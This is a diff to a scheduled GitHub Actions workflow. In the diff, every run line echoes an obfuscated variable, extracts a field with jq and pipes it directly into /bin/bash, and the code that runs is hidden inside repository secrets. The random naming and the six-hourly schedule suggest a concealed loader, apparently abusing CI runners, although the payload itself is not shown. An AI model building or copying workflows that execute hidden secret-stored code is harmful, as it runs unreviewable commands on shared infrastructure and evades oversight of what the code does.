@@ -2,22 +2,26 @@ name: chengliangqiang5432
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 4/6 * * *'
+    - cron: '35 2/6 * * *'
 
-jobs:  # 910
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chengliangqiang5432
         env:
-          jtcx006: ${{ secrets.jtcx006 }}
+          svde35804: ${{ secrets.svde35804 }}
         run: |
-          echo $jtcx006 | jq -r .c56 | /bin/bash
-          echo $iutyj34 | jq -r .ikq75389 | /bin/bash
-          echo $y33652 | jq -r .kipot5480 | /bin/bash
-          echo $fp96 | jq -r .o39427 | /bin/bash
-          echo $dfh261 | jq -r .jwt700 | /bin/bash
-          echo $oowk31661 | jq -r .zaih52 | /bin/bash
-          echo $hg359 | jq -r .vdrl7 | /bin/bash
+          echo $svde35804 | jq -r .t905 | /bin/bash
+          echo $k97 | jq -r .xvx4936 | /bin/bash
+          echo $c11759 | jq -r .yal56 | /bin/bash
+          echo $dk25045 | jq -r .t11 | /bin/bash
+          echo $dhfa583 | jq -r .on72498 | /bin/bash
+          echo $v3 | jq -r .woj23358 | /bin/bash
+          echo $skg810 | jq -r .vvjl856 | /bin/bash
+          echo $syidb5439 | jq -r .ohsa772 | /bin/bash
+          echo $zn6 | jq -r .xvcb2 | /bin/bash
+          echo $novsk1961 | jq -r .lc722 | /bin/bash
+          echo $qgjg66494 | jq -r .ehds4433 | /bin/bash
 
